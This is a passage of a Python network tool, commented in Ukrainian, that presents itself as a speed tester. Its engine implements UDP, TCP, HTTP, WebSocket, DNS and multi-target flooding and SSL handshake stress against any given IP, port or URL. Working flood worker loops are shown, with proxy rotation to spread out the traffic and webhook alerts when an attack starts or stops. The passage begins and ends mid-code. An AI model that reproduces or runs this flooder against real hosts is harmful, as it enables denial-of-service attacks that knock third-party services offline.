  <th>Час</th><th>Режим</th><th>Тривал.</th>
  <th>Avg DL</th><th>Max DL</th><th>Avg UL</th>
  <th>Total DL</th><th>Помилки</th><th>Пінг avg</th><th>P99</th><th>Нотатка</th>
</tr></thead>
<tbody>{rows_html}</tbody>
</table>
<script>
const ctx = document.getElementById('speedChart');
new Chart(ctx, {{
  type: 'line',
  data: {{
    labels: [{','.join(labels_js)}],
    datasets: [
      {{label:'DL avg MB/s',data:[{','.join(dl_data_js)}],borderColor:'#22c55e',tension:0.3,fill:true,backgroundColor:'rgba(34,197,94,0.1)'}},
      {{label:'UL avg MB/s',data:[{','.join(ul_data_js)}],borderColor:'#ef4444',tension:0.3,fill:true,backgroundColor:'rgba(239,68,68,0.1)'}}
    ]
  }},
  options: {{responsive:true,plugins:{{legend:{{labels:{{color:'#e2e8f0'}}}},title:{{display:true,text:'Швидкість по сесіях',color:'#94a3b8'}}}},scales:{{x:{{ticks:{{color:'#64748b'}}}},y:{{ticks:{{color:'#64748b'}}}}}}}}
}});
</script>
</body></html>"""
        try:
            Path(filepath).write_text(html, encoding="utf-8")
            return True
        except Exception as exc:
            log.error(f"Помилка HTML-звіту: {exc}")
            return False


session_history = SessionHistory()
ping_monitor    = PingMonitor()


# ─────────────────────────────────────────────────────────────────────────────
# 3.5. GEO IP LOOKUP (з in-memory sqlite кешем)
# ─────────────────────────────────────────────────────────────────────────────
class GeoIPResult:
    def __init__(self, data: Dict[str, Any]) -> None:
        self.country = data.get("country", "—")
        self.city    = data.get("city", "—")
        self.org     = data.get("org", "—")
        self.isp     = data.get("isp", "—")
        self.lat     = data.get("lat", 0.0)
        self.lon     = data.get("lon", 0.0)
        self.tz      = data.get("timezone", "—")
        self.ok      = data.get("status", "fail") == "success"

    def __str__(self) -> str:
        if not self.ok:
            return "GeoIP: недоступно"
        return f"{self.country}, {self.city} | ISP: {self.isp} | TZ: {self.tz}"


_geoip_cache: Dict[str, GeoIPResult] = {}
_geoip_lock = threading.Lock()


def geoip_lookup(ip: str) -> GeoIPResult:
    with _geoip_lock:
        if ip in _geoip_cache:
            return _geoip_cache[ip]
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,city,org,isp,lat,lon,timezone"
        with urllib.request.urlopen(url, timeout=5) as r:
            data = json.loads(r.read().decode())
        result = GeoIPResult(data)
    except Exception as exc:
        log.debug(f"GeoIP failed for {ip}: {exc}")
        result = GeoIPResult({})
    with _geoip_lock:
        _geoip_cache[ip] = result
    return result


# ─────────────────────────────────────────────────────────────────────────────
# 3.6. PROXY ROTATOR
# ─────────────────────────────────────────────────────────────────────────────
class ProxyRotator:
    """Автоматична ротація списку проксі для HTTP/WS запитів."""

    def __init__(self) -> None:
        self._lock  = threading.Lock()
        self._idx   = 0
        self._list: List[str] = []
        self._stats: Dict[str, Dict[str, int]] = {}

    def update(self, proxy_list: List[str]) -> None:
        with self._lock:
            self._list = [p for p in proxy_list if p.strip()]
            self._idx  = 0
            for p in self._list:
                if p not in self._stats:
                    self._stats[p] = {"ok": 0, "fail": 0}

    def next(self) -> Optional[str]:
        """Повертає наступний проксі (round-robin)."""
        with self._lock:
            if not self._list:
                return cfg.data.get("proxy_url") or None
            proxy = self._list[self._idx % len(self._list)]
            self._idx += 1
        return proxy

    def report_ok(self, proxy: str) -> None:
        with self._lock:
            if proxy in self._stats:
                self._stats[proxy]["ok"] += 1

    def report_fail(self, proxy: str) -> None:
        with self._lock:
            if proxy in self._stats:
                self._stats[proxy]["fail"] += 1

    def get_stats(self) -> Dict[str, Dict[str, int]]:
        with self._lock:
            return dict(self._stats)

    def health_check(self) -> Dict[str, bool]:
        """Перевіряє доступність кожного проксі."""
        results: Dict[str, bool] = {}
        with self._lock:
            proxies = list(self._list)
        for proxy in proxies:
            try:
                parsed = urllib.parse.urlparse(proxy)
                host   = parsed.hostname or ""
                port   = parsed.port or 8080
                with socket.create_connection((host, port), timeout=3):
                    results[proxy] = True
            except Exception:
                results[proxy] = False
        return results


proxy_rotator = ProxyRotator()


# ─────────────────────────────────────────────────────────────────────────────
# 3.7. BANDWIDTH SCHEDULER (ramp-up / ramp-down)
# ─────────────────────────────────────────────────────────────────────────────
class BandwidthScheduler:
    """
    Планувальник швидкості.
    Підтримує поступове нарощення (ramp-up) та спадання (ramp-down) потоків.
    """

    def __init__(self) -> None:
        self._lock    = threading.Lock()
        self._active  = False
        self._thread: Optional[threading.Thread] = None
        self._phase   = "idle"   # "ramp_up" | "peak" | "ramp_down" | "idle"
        self._elapsed = 0.0

    def start(self, engine: Any) -> None:
        if not cfg.data.get("scheduler_enabled"):
            return
        if self._active:
            return
        self._active = True
        self._thread = threading.Thread(
            target=self._run, args=(engine,), name="Scheduler", daemon=True
        )
        self._thread.start()
        log.info("BandwidthScheduler запущено.")

    def stop(self) -> None:
        self._active = False
        if self._thread:
            self._thread.join(timeout=5)
        self._phase = "idle"

    def _run(self, engine: Any) -> None:
        ramp = cfg.data.get("scheduler_ramp_sec", 0)
        auto = cfg.data.get("auto_stop_seconds", 0)
        start = time.monotonic()

        while self._active:
            elapsed = time.monotonic() - start
            with self._lock:
                self._elapsed = elapsed

            if auto > 0 and elapsed >= auto:
                log.info("Scheduler: авто-стоп.")
                engine.stop(note="scheduler auto-stop")
                break

            if ramp > 0 and elapsed < ramp:
                fraction = elapsed / ramp
                self._phase = "ramp_up"
                self._apply_fraction(fraction)
            elif ramp > 0 and auto > 0 and elapsed > auto - ramp:
                remain   = max(0, auto - elapsed)
                fraction = remain / ramp
                self._phase = "ramp_down"
                self._apply_fraction(fraction)
            else:
                self._phase = "peak"

            time.sleep(2.0)

    def _apply_fraction(self, fraction: float) -> None:
        """Масштабує кількість потоків відповідно до fraction [0..1]."""
        for key in ("threads_dl", "threads_ul", "threads_tcp", "threads_http",
                    "threads_ws", "threads_dns", "threads_ssl"):
            full = cfg.data.get(key, 1)
            cfg.data[f"_sched_{key}"] = max(1, int(full * fraction))

    def get_status(self) -> Dict[str, Any]:
        with self._lock:
            return {
                "active":  self._active,
                "phase":   self._phase,
                "elapsed": round(self._elapsed, 1),
            }


scheduler = BandwidthScheduler()


# ─────────────────────────────────────────────────────────────────────────────
# 3.8. WEBHOOK NOTIFIER
# ─────────────────────────────────────────────────────────────────────────────
class WebhookNotifier:
    """Надсилає сповіщення на webhook URL (Discord, Telegram, custom HTTP)."""

    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._queue: Queue = Queue()
        threading.Thread(
            target=self._worker, name="WebhookNotify", daemon=True
        ).start()

    def notify(self, message: str, data: Optional[Dict] = None) -> None:
        url = cfg.data.get("webhook_url", "")
        if not url:
            return
        self._queue.put((url, message, data or {}))

    def _worker(self) -> None:
        while True:
            try:
                url, message, data = self._queue.get(timeout=5)
                self._send(url, message, data)
            except Empty:
                continue
            except Exception as exc:
                log.debug(f"WebhookNotifier worker: {exc}")

    def _send(self, url: str, message: str, data: Dict) -> None:
        try:
            payload = json.dumps({
                "content": message,
                "embeds": [{
                    "title": f"{APP_NAME} {VERSION}",
                    "description": message,
                    "color": 3447003,
                    "fields": [
                        {"name": k, "value": str(v), "inline": True}
                        for k, v in list(data.items())[:8]
                    ],
                    "footer": {"text": f"Build {BUILD_DATE}"},
                }]
            }).encode("utf-8")
            req = urllib.request.Request(
                url, data=payload,
                headers={"Content-Type": "application/json", "User-Agent": f"{APP_NAME}/{VERSION}"},
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=8) as resp:
                log.debug(f"Webhook sent → {resp.status}")
        except Exception as exc:
            log.debug(f"Webhook send failed: {exc}")


webhook_notifier = WebhookNotifier()


# ─────────────────────────────────────────────────────────────────────────────
# 3.9. MEMORY WATCHDOG
# ─────────────────────────────────────────────────────────────────────────────
class MemoryWatchdog:
    """Моніторить RAM процесу та попереджає про витоки."""

    def __init__(self) -> None:
        self._warn_sent = False
        threading.Thread(
            target=self._run, name="MemWatchdog", daemon=True
        ).start()

    def _run(self) -> None:
        proc = psutil.Process(os.getpid())
        while True:
            try:
                mem_mb = proc.memory_info().rss / 1024 ** 2
                limit  = cfg.data.get("memory_warn_mb", 2048)
                if mem_mb > limit and not self._warn_sent:
                    log.warning(f"⚠ Пам'ять процесу {mem_mb:.0f} MB > ліміт {limit} MB!")
                    self._warn_sent = True
                elif mem_mb < limit * 0.8:
                    self._warn_sent = False
            except Exception:
                pass
            time.sleep(30)


memory_watchdog = MemoryWatchdog()


# ─────────────────────────────────────────────────────────────────────────────
# 3.10. TRAFFIC ANALYZER (pcap-lite, статистика потоків)
# ─────────────────────────────────────────────────────────────────────────────
class TrafficAnalyzer:
    """
    Lightweight traffic accounting.
    Рахує кількість пакетів / байт / помилок по режимах.
    """

    def __init__(self) -> None:
        self._lock  = threading.Lock()
        self._stats: Dict[str, Dict[str, int]] = defaultdict(
            lambda: {"pkts": 0, "bytes": 0, "errors": 0}
        )
        self._timeline: Deque[Tuple[float, str, int]] = deque(maxlen=3600)

    def record(self, mode: str, n_bytes: int, ok: bool = True) -> None:
        with self._lock:
            self._stats[mode]["pkts"]  += 1
            self._stats[mode]["bytes"] += n_bytes
            if not ok:
                self._stats[mode]["errors"] += 1
            self._timeline.append((time.monotonic(), mode, n_bytes))

    def get_summary(self) -> Dict[str, Any]:
        with self._lock:
            return {
                mode: dict(s) for mode, s in self._stats.items()
            }

    def get_timeline(self, last_n: int = 60) -> List[Tuple[float, str, int]]:
        with self._lock:
            return list(self._timeline)[-last_n:]

    def reset(self) -> None:
        with self._lock:
            self._stats.clear()
            self._timeline.clear()

    def throughput_by_mode(self, window_sec: float = 5.0) -> Dict[str, float]:
        now = time.monotonic()
        result: Dict[str, float] = defaultdict(float)
        with self._lock:
            tl = list(self._timeline)
        for ts, mode, n in tl:
            if now - ts <= window_sec:
                result[mode] += n
        return {m: v / window_sec for m, v in result.items()}


traffic_analyzer = TrafficAnalyzer()


# ─────────────────────────────────────────────────────────────────────────────
# 3.11. CSV LIVE EXPORTER
# ─────────────────────────────────────────────────────────────────────────────
class CsvLiveExporter:
    """Записує live-статистику у CSV в реальному часі."""

    def __init__(self) -> None:
        self._active   = False
        self._thread:  Optional[threading.Thread] = None
        self._filepath = CSV_LIVE_FILE

    def start(self, engine: Any) -> None:
        if not cfg.data.get("csv_live_export"):
            return
        self._active = True
        self._thread = threading.Thread(
            target=self._run, args=(engine,), name="CsvLiveExp", daemon=True
        )
        try:
            with open(self._filepath, "w", newline="", encoding="utf-8") as f:
                w = csv.writer(f)
                w.writerow(["timestamp", "mode", "dl_speed_mbs", "ul_speed_mbs",
                             "dl_total_gb", "ul_total_gb", "threads", "errors",
                             "ping_ms", "cpu_pct", "ram_pct"])
        except Exception as exc:
            log.error(f"CsvLiveExporter open: {exc}")
        self._thread.start()
        log.info(f"CSV live export → {self._filepath}")

    def stop(self) -> None:
        self._active = False

    def _run(self, engine: Any) -> None:
        while self._active:
            try:
                s  = engine.get_stats()
                ps = ping_monitor.get_stats()
                cpu = psutil.cpu_percent(interval=None)
                mem = psutil.virtual_memory().percent
                row = [
                    datetime.now().isoformat(),
                    s["mode"],
                    round(s["dl_speed_now"] / 1024**2, 3),
                    round(s["ul_speed_now"] / 1024**2, 3),
                    round(s["dl"] / 1024**3, 6),
                    round(s["ul"] / 1024**3, 6),
                    s["active_threads"],
                    s["err"],
                    round(ps["last"], 2) if ps.get("last") else "",
                    cpu, mem,
                ]
                with open(self._filepath, "a", newline="", encoding="utf-8") as f:
                    csv.writer(f).writerow(row)
            except Exception as exc:
                log.debug(f"CsvLiveExporter: {exc}")
            time.sleep(1.0)


csv_live_exporter = CsvLiveExporter()


# ─────────────────────────────────────────────────────────────────────────────
# 3.12. PLUGIN LOADER
# ─────────────────────────────────────────────────────────────────────────────
class PluginManager:
    """
    Завантажує плагіни з папки plugins/.
    Плагін — файл .py із функцією run(engine, cfg) -> None.
    """

    def __init__(self) -> None:
        self._plugins: Dict[str, Any] = {}
        self._lock = threading.Lock()

    def discover(self) -> List[str]:
        return [p.stem for p in PLUGINS_DIR.glob("*.py") if not p.stem.startswith("_")]

    def load(self, name: str) -> bool:
        path = PLUGINS_DIR / f"{name}.py"
        if not path.exists():
            log.warning(f"Plugin '{name}' не знайдено.")
            return False
        try:
            spec = importlib.util.spec_from_file_location(name, path)
            if spec is None or spec.loader is None:
                raise ImportError("spec_from_file_location failed")
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)  # type: ignore
            if not hasattr(mod, "run"):
                raise AttributeError(f"Plugin '{name}' не має функції run().")
            with self._lock:
                self._plugins[name] = mod
            log.info(f"Plugin '{name}' завантажено.")
            return True
        except Exception as exc:
            log.error(f"Не вдалося завантажити plugin '{name}': {exc}")
            return False

    def run_plugin(self, name: str, engine: Any) -> None:
        with self._lock:
            mod = self._plugins.get(name)
        if mod is None:
            log.warning(f"Plugin '{name}' не завантажено.")
            return
        try:
            threading.Thread(
                target=mod.run, args=(engine, cfg),
                name=f"Plugin-{name}", daemon=True
            ).start()
            log.info(f"Plugin '{name}' запущено.")
        except Exception as exc:
            log.error(f"Plugin '{name}' помилка: {exc}")

    def list_loaded(self) -> List[str]:
        with self._lock:
            return list(self._plugins.keys())


plugin_manager = PluginManager()


# ─────────────────────────────────────────────────────────────────────────────
# 4. МЕРЕЖЕВИЙ РУШІЙ
# ─────────────────────────────────────────────────────────────────────────────
class EngineMode(Enum):
    IDLE        = "IDLE"
    DOWNLOADING = "DOWNLOADING"
    UDP_FLOOD   = "UDP FLOOD"
    TCP_FLOOD   = "TCP FLOOD"
    HTTP_FLOOD  = "HTTP FLOOD"
    PING_TEST   = "PING TEST"
    WS_FLOOD    = "WS FLOOD"
    DNS_FLOOD   = "DNS FLOOD"
    SSL_STRESS  = "SSL STRESS"
    MULTI_TARGET= "MULTI TARGET"


class NetworkEngine:
    _DL_HEADERS = {
        "User-Agent":      f"Mozilla/5.0 (compatible; {APP_NAME}/{VERSION}; speed-test)",
        "Accept-Encoding": "identity",
        "Connection":      "keep-alive",
    }
    _DL_TIMEOUT  = aiohttp.ClientTimeout(connect=15, sock_connect=15, sock_read=None)
    _CHUNK_SIZE  = 512 * 1024   # 512 KiB

    def __init__(self) -> None:
        self.running      = False
        self.mode         = EngineMode.IDLE
        self.lock         = threading.Lock()
        self._stop_event  = threading.Event()

        # Counters
        self.dl_total:    int   = 0
        self.ul_total:    int   = 0
        self.errors:      int   = 0
        self.last_error:  str   = "—"
        self.start_time:  Optional[float] = None

        # Speed tracking
        self.max_dl_speed:      float = 0.0
        self.max_ul_speed:      float = 0.0
        self.dl_speeds_history: List[float] = []
        self.ul_speeds_history: List[float] = []
        self._dl_speed_now:     float = 0.0
        self._ul_speed_now:     float = 0.0
        self._speed_lock        = threading.Lock()
        self._prev_dl:          int   = 0
        self._prev_ul:          int   = 0
        self._prev_t:           float = time.monotonic()

        # Thread counter
        self._active_threads: int = 0

        # Ping test results
        self.ping_results:    List[float] = []
        self.ping_sent:       int = 0
        self.ping_recv:       int = 0

        # Percentile stats
        self.latency_percentile = PercentileStats()

        # Bandwidth limiters
        self._dl_limiter = BandwidthLimiter(cfg.data.get("bandwidth_limit_dl", 0))
        self._ul_limiter = BandwidthLimiter(cfg.data.get("bandwidth_limit_ul", 0))

        # Connection pool recycler
        self._pool_last_recycle: float = time.monotonic()

        # Asyncio event loop
        self.loop = asyncio.new_event_loop()
        threading.Thread(
            target=self._async_loop_manager, name="AsyncLoop", daemon=True
        ).start()

        # Speed updater
        threading.Thread(
            target=self._speed_updater, name="SpeedUpdater", daemon=True
        ).start()

        # Pool recycler
        threading.Thread(
            target=self._pool_recycler, name="PoolRecycler", daemon=True
        ).start()

    # ── Internal ──────────────────────────────────────────────────────────
    def _async_loop_manager(self) -> None:
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()

    def _speed_updater(self) -> None:
        while True:
            time.sleep(1.0)
            with self.lock:
                now    = time.monotonic()
                dt     = max(now - self._prev_t, 1e-6)
                dl_now = (self.dl_total - self._prev_dl) / dt
                ul_now = (self.ul_total - self._prev_ul) / dt
                self._prev_dl = self.dl_total
                self._prev_ul = self.ul_total
                self._prev_t  = now
            with self._speed_lock:
                self._dl_speed_now = dl_now
                self._ul_speed_now = ul_now
            if self.running:
                with self.lock:
                    dl_mbs = dl_now / 1024**2
                    ul_mbs = ul_now / 1024**2
                    self.dl_speeds_history.append(dl_mbs)
                    self.ul_speeds_history.append(ul_mbs)
                    self.max_dl_speed = max(self.max_dl_speed, dl_mbs)
                    self.max_ul_speed = max(self.max_ul_speed, ul_mbs)

    def _pool_recycler(self) -> None:
        """Перезапускає потоки, що зупинились (recycler)."""
        while True:
            time.sleep(10)
            if not self.running:
                continue
            recycle_sec = cfg.data.get("pool_recycle_sec", 120)
            now = time.monotonic()
            if now - self._pool_last_recycle < recycle_sec:
                continue
            self._pool_last_recycle = now
            with self.lock:
                alive = self._active_threads
            if alive == 0 and self.running:
                log.warning("PoolRecycler: усі потоки зупинились. Перезапуск.")
                self._restart_mode()

    def _restart_mode(self) -> None:
        """Перезапускає поточний режим без зупинки engine."""
        m = self.mode
        ip   = cfg.data.get("target_ip", "")
        port = cfg.data.get("target_port", 80)
        if m == EngineMode.DOWNLOADING:
            n = cfg.data["threads_dl"]
            for _ in range(n):
                asyncio.run_coroutine_threadsafe(self._dl_task(), self.loop)
        elif m == EngineMode.UDP_FLOOD:
            n = cfg.data["threads_ul"]
            for i in range(n):
                threading.Thread(
                    target=self._udp_task, args=(ip, port),
                    name=f"UDP-R{i+1}", daemon=True
                ).start()
        elif m == EngineMode.TCP_FLOOD:
            n = cfg.data["threads_tcp"]
            for i in range(n):
                threading.Thread(
                    target=self._tcp_task, args=(ip, port),
                    name=f"TCP-R{i+1}", daemon=True
                ).start()

    def _reset_stats(self) -> None:
        with self.lock:
            self.dl_total = self.ul_total = self.errors = 0
            self.last_error   = "—"
            self.start_time   = None
            self.max_dl_speed = self.max_ul_speed = 0.0
            self.dl_speeds_history.clear()
            self.ul_speeds_history.clear()
            self._active_threads = 0
            self.ping_results.clear()
            self.ping_sent = self.ping_recv = 0
            self._prev_dl  = self._prev_ul = 0
            self._prev_t   = time.monotonic()
        self.latency_percentile.clear()
        traffic_analyzer.reset()

    def _inc_threads(self) -> None:
        with self.lock:
            self._active_threads += 1

    def _dec_threads(self) -> None:
        with self.lock:
            self._active_threads = max(0, self._active_threads - 1)

    def _record_error(self, exc: Exception) -> None:
        with self.lock:
            self.errors     += 1
            self.last_error  = str(exc)[:80]

    # ── Public API ────────────────────────────────────────────────────────
    def start_download(self) -> None:
        if self.running:
            return
        urls = cfg.data.get("download_urls", [])
        if not urls:
            log.error("Список URL порожній.")
            return
        self._dl_limiter.update_rate(cfg.data.get("bandwidth_limit_dl", 0))
        proxy_list = cfg.data.get("proxy_list", [])
        if proxy_list:
            proxy_rotator.update(proxy_list)
        self._reset_stats()
        self._stop_event.clear()
        self.mode       = EngineMode.DOWNLOADING
        self.start_time = time.monotonic()
        self.running    = True
        n = cfg.data["threads_dl"]
        log.info(f"ENGINE: START {self.mode.value}  threads={n}")
        for _ in range(n):
            asyncio.run_coroutine_threadsafe(self._dl_task(), self.loop)
        if cfg.data.get("webhook_on_start"):
            webhook_notifier.notify(
                f"🚀 {APP_NAME} {VERSION}: Запущено {self.mode.value}",
                {"threads": n, "target": "download"}
            )
        scheduler.start(self)
        csv_live_exporter.start(self)

    def start_flood(self, ip: str, port: int, mode: EngineMode = EngineMode.UDP_FLOOD) -> None:
        if self.running:
            return
        self._ul_limiter.update_rate(cfg.data.get("bandwidth_limit_ul", 0))
        proxy_list = cfg.data.get("proxy_list", [])
        if proxy_list:
            proxy_rotator.update(proxy_list)
        self._reset_stats()
        self._stop_event.clear()
        cfg.data.update({"target_ip": ip, "target_port": port})
        cfg.save()
        self.mode       = mode
        self.start_time = time.monotonic()
        self.running    = True

        if mode == EngineMode.UDP_FLOOD:
            n = cfg.data["threads_ul"]
            log.warning(f"ENGINE: START {mode.value} → {ip}:{port}  threads={n}")
            for i in range(n):
                threading.Thread(
                    target=self._udp_task, args=(ip, port),
                    name=f"UDP-{i+1}", daemon=True
                ).start()
        elif mode == EngineMode.TCP_FLOOD:
            n = cfg.data["threads_tcp"]
            log.warning(f"ENGINE: START {mode.value} → {ip}:{port}  threads={n}")
            for i in range(n):
                threading.Thread(
                    target=self._tcp_task, args=(ip, port),
                    name=f"TCP-{i+1}", daemon=True
                ).start()

        ping_monitor.start(ip, port)
        if cfg.data.get("webhook_on_start"):
            webhook_notifier.notify(
                f"🚀 {APP_NAME} {VERSION}: Запущено {mode.value}",
                {"target": f"{ip}:{port}", "threads": n}
            )
        scheduler.start(self)
        csv_live_exporter.start(self)

    def start_http_flood(self, url: str) -> None:
        if self.running:
            return
        self._ul_limiter.update_rate(cfg.data.get("bandwidth_limit_ul", 0))
        proxy_list = cfg.data.get("proxy_list", [])
        if proxy_list:
            proxy_rotator.update(proxy_list)
        self._reset_stats()
        self._stop_event.clear()
        cfg.data["http_target_url"] = url
        cfg.save()
        self.mode       = EngineMode.HTTP_FLOOD
        self.start_time = time.monotonic()
        self.running    = True
        n = cfg.data["threads_http"]
        log.warning(f"ENGINE: START {self.mode.value} → {url}  threads={n}")
        for _ in range(n):
            asyncio.run_coroutine_threadsafe(self._http_flood_task(url), self.loop)
        if cfg.data.get("webhook_on_start"):
            webhook_notifier.notify(
                f"🚀 {APP_NAME} {VERSION}: HTTP Flood",
                {"url": url[:60], "threads": n}
            )
        scheduler.start(self)
        csv_live_exporter.start(self)

    def start_ws_flood(self, url: str) -> None:
        """WebSocket Flood — масові WS-з'єднання."""
        if self.running:
            return
        self._reset_stats()
        self._stop_event.clear()
        cfg.data["ws_target_url"] = url
        self.mode       = EngineMode.WS_FLOOD
        self.start_time = time.monotonic()
        self.running    = True
        n = cfg.data["threads_ws"]
        log.warning(f"ENGINE: START {self.mode.value} → {url}  threads={n}")
        for _ in range(n):
            asyncio.run_coroutine_threadsafe(self._ws_flood_task(url), self.loop)
        scheduler.start(self)
        csv_live_exporter.start(self)

    def start_dns_flood(self, target_ip: str, target_port: int = 53) -> None:
        """DNS Flood — масові UDP DNS-запити."""
        if self.running:
            return
        self._reset_stats()
        self._stop_event.clear()
        self.mode       = EngineMode.DNS_FLOOD
        self.start_time = time.monotonic()
        self.running    = True
        n = cfg.data["threads_dns"]
        log.warning(f"ENGINE: START {self.mode.value} → {target_ip}:{target_port}  threads={n}")
        for i in range(n):
            threading.Thread(
                target=self._dns_flood_task, args=(target_ip, target_port),
                name=f"DNS-{i+1}", daemon=True
            ).start()
        scheduler.start(self)
        csv_live_exporter.start(self)

    def start_ssl_stress(self, host: str, port: int = 443) -> None:
        """SSL/TLS Stress Test — масові TLS-рукостискання."""
        if self.running:
            return
        self._reset_stats()
        self._stop_event.clear()
        self.mode       = EngineMode.SSL_STRESS
        self.start_time = time.monotonic()
        self.running    = True
        n = cfg.data["threads_ssl"]
        log.warning(f"ENGINE: START {self.mode.value} → {host}:{port}  threads={n}")
        for i in range(n):
            threading.Thread(
                target=self._ssl_stress_task, args=(host, port),
                name=f"SSL-{i+1}", daemon=True
            ).start()
        scheduler.start(self)
        csv_live_exporter.start(self)

    def start_multi_target(self, targets: List[Tuple[str, int]], mode: EngineMode) -> None:
        """Multi-Target — одночасний флад кількох IP."""
        if self.running or not targets:
            return
        self._reset_stats()
        self._stop_event.clear()
        self.mode       = EngineMode.MULTI_TARGET
        self.start_time = time.monotonic()
        self.running    = True
        n_per = max(1, cfg.data["threads_ul"] // len(targets))
        log.warning(
            f"ENGINE: START {self.mode.value}  targets={len(targets)}  "
            f"threads_per_target={n_per}"
        )
        for ip, port in targets:
            if mode == EngineMode.UDP_FLOOD:
                for i in range(n_per):
                    threading.Thread(
                        target=self._udp_task, args=(ip, port),
                        name=f"MT-UDP-{ip}-{i+1}", daemon=True
                    ).start()
            elif mode == EngineMode.TCP_FLOOD:
                for i in range(n_per):
                    threading.Thread(
                        target=self._tcp_task, args=(ip, port),
                        name=f"MT-TCP-{ip}-{i+1}", daemon=True
                    ).start()
        scheduler.start(self)
        csv_live_exporter.start(self)

    def start_ping_test(self, ip: str, port: int, count: int = 100) -> None:
        if self.running:
            return
        self._reset_stats()
        self._stop_event.clear()
        cfg.data.update({"target_ip": ip, "target_port": port})
        self.mode       = EngineMode.PING_TEST
        self.start_time = time.monotonic()
        self.running    = True
        log.info(f"ENGINE: START {self.mode.value} → {ip}:{port}  count={count}")
        threading.Thread(
            target=self._ping_test_task, args=(ip, port, count),
            name="PingTest", daemon=True
        ).start()

    def stop(self, note: str = "") -> None:
        if not self.running:
            return
        log.info("ENGINE: STOP — зупинка всіх операцій.")
        self.running = False
        self._stop_event.set()
        scheduler.stop()
        csv_live_exporter.stop()
        time.sleep(0.5)
        self._stop_event.clear()
        ping_monitor.stop()
        report = self.generate_and_save_report(note=note)
        if cfg.data.get("webhook_on_stop"):
            stats = self.get_stats()
            webhook_notifier.notify(
                f"⏹ {APP_NAME} {VERSION}: Зупинено {self.mode.value}",
                {
                    "DL avg": f"{report.get('avg_download_mbs', 0):.2f} MB/s",
                    "UL avg": f"{report.get('avg_upload_mbs', 0):.2f} MB/s",
                    "Duration": f"{report.get('duration_seconds', 0):.0f}s",
                    "Errors": report.get("errors_count", 0),
                }
            )
        self.mode = EngineMode.IDLE

    # ── Worker: HTTP Download ─────────────────────────────────────────────
    async def _dl_task(self) -> None:
        self._inc_threads()
        proxy      = proxy_rotator.next()
        verify_ssl = cfg.data.get("ssl_verify", False)
        try:
            connector = aiohttp.TCPConnector(
                ssl=None if verify_ssl else False,
                limit=0, ttl_dns_cache=300,
                family=socket.AF_INET6 if cfg.data.get("use_ipv6") else socket.AF_INET,
            )
            async with aiohttp.ClientSession(
                connector=connector,
                headers=self._DL_HEADERS,
                timeout=self._DL_TIMEOUT,
            ) as sess:
                while self.running and not self._stop_event.is_set():
                    urls = cfg.data.get("download_urls", [])
                    if not urls:
                        break
                    url = random.choice(urls)
                    try:
                        async with sess.get(url, proxy=proxy) as resp:
                            resp.raise_for_status()
                            async for chunk in resp.content.iter_chunked(self._CHUNK_SIZE):
                                if not self.running or self._stop_event.is_set():
                                    return
                                n = len(chunk)
                                self._dl_limiter.acquire(n)
                                with self.lock:
                                    self.dl_total += n
                                traffic_analyzer.record("DOWNLOADING", n, ok=True)
                    except Exception as exc:
                        self._record_error(exc)
                        traffic_analyzer.record("DOWNLOADING", 0, ok=False)
                        if proxy:
                            proxy_rotator.report_fail(proxy)
                        proxy = proxy_rotator.next()
                        await asyncio.sleep(1)
        except Exception as exc:
            self._record_error(exc)
        finally:
            self._dec_threads()

    # ── Worker: UDP Flood ─────────────────────────────────────────────────
    def _udp_task(self, ip: str, port: int) -> None:
        self._inc_threads()
        try:
            family = socket.AF_INET6 if cfg.data.get("use_ipv6") else socket.AF_INET
            sock   = socket.socket(family, socket.SOCK_DGRAM)
            sock.setblocking(False)
            while self.running and not self._stop_event.is_set():
                size    = cfg.data.get("packet_size", 4096)
                tpl     = cfg.data.get("payload_template", "random")
                payload = generate_payload(size, tpl)
                try:
                    sock.sendto(payload, (ip, port))
                    n = len(payload)
                    self._ul_limiter.acquire(n)
                    with self.lock:
                        self.ul_total += n
                    traffic_analyzer.record("UDP FLOOD", n, ok=True)
                except BlockingIOError:
                    time.sleep(0.001)
                except Exception as exc:
                    self._record_error(exc)
                    traffic_analyzer.record("UDP FLOOD", 0, ok=False)
                    time.sleep(0.01)
        except Exception as exc:
            self._record_error(exc)
        finally:
            try:
                sock.close()
            except Exception:
                pass
            self._dec_threads()

    # ── Worker: TCP Flood ─────────────────────────────────────────────────
    def _tcp_task(self, ip: str, port: int) -> None:
        self._inc_threads()
        try:
            family = socket.AF_INET6 if cfg.data.get("use_ipv6") else socket.AF_INET
            while self.running and not self._stop_event.is_set():
                size    = cfg.data.get("packet_size", 4096)
                tpl     = cfg.data.get("payload_template", "random")
                payload = generate_payload(size, tpl)
                try:
                    with socket.socket(family, socket.SOCK_STREAM) as s:
                        s.settimeout(3.0)
                        s.connect((ip, port))
                        sent = s.sendall(payload)
                        n    = size
                        self._ul_limiter.acquire(n)
                        with self.lock:
                            self.ul_total += n
                        traffic_analyzer.record("TCP FLOOD", n, ok=True)
                except Exception as exc:
                    self._record_error(exc)
                    traffic_analyzer.record("TCP FLOOD", 0, ok=False)
                    time.sleep(0.05)
        except Exception as exc:
            self._record_error(exc)
        finally:
            self._dec_threads()

    # ── Worker: HTTP Flood ────────────────────────────────────────────────
    async def _http_flood_task(self, url: str) -> None:
        self._inc_threads()
        proxy      = proxy_rotator.next()
        method     = cfg.data.get("http_method", "GET").upper()
        headers    = dict(cfg.data.get("http_custom_headers") or {})
        headers.setdefault("User-Agent", f"Mozilla/5.0 ({APP_NAME}/{VERSION})")
        body_str   = cfg.data.get("http_body", "")
        body       = body_str.encode() if body_str else None
        verify_ssl = cfg.data.get("ssl_verify", False)
        try:
            connector = aiohttp.TCPConnector(
                ssl=None if verify_ssl else False, limit=0,
                family=socket.AF_INET6 if cfg.data.get("use_ipv6") else socket.AF_INET,
            )
            async with aiohttp.ClientSession(
                connector=connector,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=10),
            ) as sess:
                while self.running and not self._stop_event.is_set():
                    try:
                        t0 = time.monotonic()
                        async with sess.request(
                            method, url, data=body, proxy=proxy
                        ) as resp:
                            data = await resp.read()
                            rtt  = (time.monotonic() - t0) * 1000.0
                            n    = len(data)
                            with self.lock:
                                self.ul_total += len(body) if body else 0
                                self.dl_total += n
                            self.latency_percentile.add(rtt)
                            traffic_analyzer.record("HTTP FLOOD", n, ok=True)
                            if proxy:
                                proxy_rotator.report_ok(proxy)
